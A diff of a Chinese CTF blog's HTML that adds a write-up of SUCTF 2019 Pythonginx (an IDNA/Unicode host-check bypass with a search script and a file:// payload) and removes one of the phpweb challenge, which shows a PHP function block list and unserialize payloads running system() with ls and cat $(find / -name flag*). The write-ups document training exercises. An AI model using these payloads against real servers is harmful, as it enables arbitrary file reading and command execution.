@@ -71,6 +71,62 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-69" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-69/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:41.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/13/page-69/">SUCTF 2019 Pythonginx</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>这关主要是url中的unicode漏洞引发的域名安全问题</strong><br>1、域名欺骗 ：<br>访问此网站http://Вaidu.com(其中的В是unicode U+0412)<br>会跳转到<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a><br>也可以换成其他的unicode<br>访问http://Вaidu.com 时浏览器会将访问的url交给域名系统（DNS）解析url为ip地址<br>解析url过程用到递归查询和迭代查询 先递归搜索浏览器自己的dns缓存然后搜索操作系统的dns缓存 再搜索hosts文件缓存<br>搜索本地域名服务器 但后迭代搜索根域名服务器知道找到ip地址 找不到就是404<br>在DNS中idna使用punycode转写将ascii字符串存储，本地DNS中因为遇见特殊字符В 因此无法将其转成正常ascii<br>就直接在本地转化为<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/22.PNG?raw=true" alt="22.PNG"></p>
+<p><strong>还有要知道ngix重要文件的位置</strong><br><strong>nginx重要文件的位置：</strong></p>
+<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
+<p>源码这边<br> @app.route(‘/getUrl’, methods=[‘GET’, ‘POST’])<br>def getUrl():<br>    url = request.args.get(“url”)<br>    host = parse.urlparse(url).hostname<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 111”<br>    parts = list(urlsplit(url))<br>    host = parts[1]<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 222 “ + host<br>    newhost = []<br>    for h in host.split(‘.’):<br>        newhost.append(h.encode(‘idna’).decode(‘utf-8’))<br>    parts[1] = ‘.’.join(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = urlunsplit(parts).split(‘ ‘)[0]<br>    host = parse.urlparse(finalUrl).hostname<br>    if host == ‘suctf.cc’:<br>        return urllib.request.urlopen(finalUrl).read()<br>    else:<br>        return “我扌 your problem? 333”<br>    </code><br>    <!-- Dont worry about the suctf.cc. Go on! --><br>    <!-- Do you know the nginx? --></p>
+</body>
+是要对host的判断然后绕过这两个判断
+如果一开始就是suctf.cc压根就没办法 
+
+<p><strong>需要访问suctf.cc/user/local/nginx/conf/nginx.conf</strong>  访问这个配置文件应该能找到flag 位置<br>跑脚本 </p>
+<p>#coding:utf-8</p>
+<p>for i in range(128,65537):<br>    tmp=chr(i)<br>    try:<br>        res = tmp.encode(‘idna’).decode(‘utf-8’)<br>        if(“-“) in res:<br>            continue<br>        print(“U:{}    A:{}      ascii:{} “.format(tmp, res, i))<br>    except:<br>        pass</p>
+<p><strong>找到℆这么一个字符恰好会因为这个漏洞被解析成c/u 这样就能绕过</strong></p>
+<p>构造file://suctf.c℆sr/local/nginx/conf/nginx.conf  也可以用ℂ 来替代c</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/23.PNG?raw=true" alt="23.PNG"></p>
+<p>最终payload：</p>
+<p>file://suctf.c℆sr/fffffflag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/24.PNG?raw=true" alt="24.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-69/" data-id="ckroqtfm5001dyww76gmd19im" data-title="SUCTF 2019 Pythonginx" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-68" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/13/page-68/" class="article-date">
@@ -644,117 +700,6 @@ post: $flag=flag
 
 
   
-    <article id="post-page-58" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/08/page-58/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:44:25.000Z" itemprop="datePublished">2021-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-58/">网鼎杯 2020 朱雀组phpweb</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>主页这边抓包发现 func=date&amp;p=Y-m-d+h%3Ai%3As+a  这句话这边可以传参 </p>
-<p>func=file_get_contents&amp;p=index.php  然后给了一堆的源码</p>
-<?php
-$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");       ；这边func可以用的功能被禁用了一大堆就很烦 但是反序列化可以
-function gettime($func, $p) {
-    $result = call_user_func($func, $p);
-    $a= gettype($result);
-    if ($a == "string") {
-        return $result;
-    } else {return "";}
-}
-class Test {
-    var $p = "Y-m-d h:i:s a";
-    var $func = "date";
-    function __destruct() {
-        if ($this->func != "") {
-            echo gettime($this->func, $this->p);
-        }
-    }
-}
-$func = $_REQUEST["func"];
-$p = $_REQUEST["p"];
-
-if ($func != null) {
-    $func = strtolower($func);
-    if (!in_array($func,$disable_fun)) {
-        echo gettime($func, $p);
-    }else {
-        die("Hacker...");
-    }
-}
-?>
-
-<p>虽然被禁用了一大堆但是还有反序列化可以用  func=unserialize&amp;p=index.php</p>
-<?php
-class Test {
-    var $p = "ls";
-    var $func = "system";
-    function __destruct() {
-        if ($this->func != "") {
-            echo gettime($this->func, $this->p);
-        }
-    }
-}
-
-$a=new Test();
-echo serialize($a);    
-
-贴一下构造的序列化代码构造这个生成O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";} 
-
-payload1
-
- func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}   获得文件列表
-
-func=unserialize&p=O:4:"Test":2:{s:1:"p";s:14:"ls ../../../..";s:4:"func";s:6:"system";}  然后给了更多
-
-
-
-但是你丫的怎么没有flag ┗|｀O′|┛
-
-![wwwwww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/wwwwww.png?raw=true)
-
-**知识点：寻找flag文件常用命令小结：**
-system(‘ls’) : 列举当前目录下的所有文件
-system(“find / -name flag*”)：查找所有文件名匹配flag*的文件
-system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件
-
-那么这个p就得变成p=cat $(find / -name flag*)
-
-func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}  最终payload
-
-![weww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/weww.png?raw=true)
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-58/" data-id="ckroqtfm00012yww741ene234" data-title="网鼎杯 2020 朱雀组phpweb" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -795,6 +740,10 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"f
           </li>
         
           <li>
+            <a href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -804,10 +753,6 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"f
         
           <li>
             <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
           </li>
         
       </ul>
